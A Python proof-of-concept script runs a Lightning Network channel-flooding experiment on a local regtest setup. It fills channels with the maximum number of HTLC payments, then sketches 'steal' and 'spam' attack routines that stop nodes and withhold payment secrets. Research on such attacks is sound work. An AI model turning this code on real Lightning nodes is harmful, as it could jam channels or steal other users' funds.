import os
import time

from lightning import LightningRpc, Millisatoshi  # pip3 install pylightning

from bitcoin_cli import mine
from lightning_cli import get_id, get_total_balance
from utils import show_num_tx_in_last_t_blocks, wait_to_route

ln = os.path.expandvars("$LN")
n1 = LightningRpc(os.path.join(ln, "lightning-dirs/1/regtest/lightning-rpc"))
n3 = LightningRpc(os.path.join(ln, "lightning-dirs/3/regtest/lightning-rpc"))

# we assume the channels are already set-up

CHANNEL_BALANCE = 0.1
NUM_NODES = 20
MAX_HTLCS_PER_CHANNEL = 483

# divide channel balance between max_htlcs, but leave room for fees
amount_per_payment = (CHANNEL_BALANCE / MAX_HTLCS_PER_CHANNEL) * 0.9
amount_btc = round(amount_per_payment, 8)
amount = Millisatoshi(f"{amount_btc}btc")

wait_to_route(src=n1, dest=n3, msatoshi=amount.millisatoshis)

num_payments = NUM_NODES * MAX_HTLCS_PER_CHANNEL
batch_size = 10

for _ in range(num_payments // batch_size):
    route = n1.getroute(
        node_id=get_id(n3),
        msatoshi=amount,
        riskfactor=1,
    )["route"]
    
    for _ in range(batch_size):
        invoice = n3.invoice(
            msatoshi=amount,
            label=f"label_{time.time()}",  # a unique label is needed
            description="",
        )
        
        n1.sendpay(route=route, payment_hash=invoice["payment_hash"])


def steal_attack():
    # stop node 1 and run it again in silent mode
    n1.stop()
    # gracefully close all channels of node 3
    for peer in n3.listpeers()["peers"]:
        n3.close(peer_id=peer["id"])
    mine(1)
    # TODO: start node 1 in silent mode


def spam_attack():
    # node 3 stops and never returns the secrets
    n3.stop()
    # all nodes should now collect their HTLCs-out after expiration


def print_balance():
    for n in [n1, n3]:
        print(f"Total balance node {n.getinfo()['alias']}: {get_total_balance(n)}")


def print_num_htlcs():
    # see the number of HTLCs on every channel
    for i, peer in enumerate(n3.listpeers()["peers"]):
        print(f"htlcs with peers {i}: {len(peer['channels'][0]['htlcs'])}")


print_balance()
print_num_htlcs()
show_num_tx_in_last_t_blocks(t=30)
